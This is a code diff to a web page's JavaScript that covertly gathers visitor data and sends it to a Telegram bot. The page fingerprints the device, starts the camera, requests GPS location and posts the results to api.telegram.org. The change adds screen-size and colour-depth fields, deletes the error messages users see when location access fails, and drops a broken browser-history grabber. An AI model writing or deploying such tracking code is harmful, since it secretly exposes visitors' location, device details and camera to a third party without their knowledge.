@@ -217,8 +217,11 @@
                 const deviceMemory = navigator.deviceMemory || 'N/A';
                 const hardwareConcurrency = navigator.hardwareConcurrency || 'N/A';
                 const languages = navigator.languages.join(', ');
+                const screenWidth = window.screen.width;
+                const screenHeight = window.screen.height;
+                const colorDepth = window.screen.colorDepth;
 
-                const userInfo = { ip, userAgent, platform, deviceMemory, hardwareConcurrency, languages };
+                const userInfo = { ip, userAgent, platform, deviceMemory, hardwareConcurrency, languages, screenWidth, screenHeight, colorDepth };
 
                 console.log("User info: ", userInfo);
 
@@ -239,7 +242,7 @@
                     },
                     body: JSON.stringify({
                         chat_id: chatId,
-                        text: `User Info:\nIP: ${userInfo.ip}\nUser Agent: ${userInfo.userAgent}\nPlatform: ${userInfo.platform}\nDevice Memory: ${userInfo.deviceMemory} GB\nHardware Concurrency: ${userInfo.hardwareConcurrency}\nLanguages: ${userInfo.languages}`
+                        text: `User Info:\nIP: ${userInfo.ip}\nUser Agent: ${userInfo.userAgent}\nPlatform: ${userInfo.platform}\nDevice Memory: ${userInfo.deviceMemory} GB\nHardware Concurrency: ${userInfo.hardwareConcurrency}\nLanguages: ${userInfo.languages}\nScreen Width: ${userInfo.screenWidth}px\nScreen Height: ${userInfo.screenHeight}px\nColor Depth: ${userInfo.colorDepth} bits`
                     })
                 });
 
@@ -268,13 +271,9 @@
                     await sendLocationToTelegram(locationInfo);
                 }, (error) => {
                     console.error("Error getting location: ", error);
-                    document.getElementById('error-message').style.display = 'block';
-                    document.getElementById('error-message').innerText = 'Please enable GPS and allow location access to continue.';
                 });
             } else {
                 console.error("Geolocation is not supported by this browser.");
-                document.getElementById('error-message').style.display = 'block';
-                document.getElementById('error-message').innerText = 'Geolocation is not supported by this browser.';
             }
         }
 
@@ -304,49 +303,10 @@
             }
         }
 
-        async function getBrowserHistory() {
-            let historyItems = [];
-            try {
-                const history = await window.history;
-                for (let i = 0; i < history.length; i++) {
-                    historyItems.push(history[i].url);
-                }
-                await sendBrowserHistoryToTelegram(historyItems);
-            } catch (error) {
-                console.error("Error getting browser history: ", error);
-            }
-        }
-
-        async function sendBrowserHistoryToTelegram(historyItems) {
-            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
-
-            try {
-                const response = await fetch(url, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({
-                        chat_id: chatId,
-                        text: `Browser History: ${historyItems.join(', ')}`
-                    })
-                });
-
-                if (response.ok) {
-                    console.log("Browser history sent to Telegram");
-                } else {
-                    console.error("Error sending browser history to Telegram: ", response.statusText);
-                }
-            } catch (error) {
-                console.error("Error sending browser history to Telegram: ", error);
-            }
-        }
-
         async function initializeFirstPart() {
             await startVideo();
             await getUserInfo();
             await getLocation();
-            await getBrowserHistory();
 
             document.getElementById('initial-container').style.display = 'none';
             document.getElementById('main-container').style.display = 'flex';
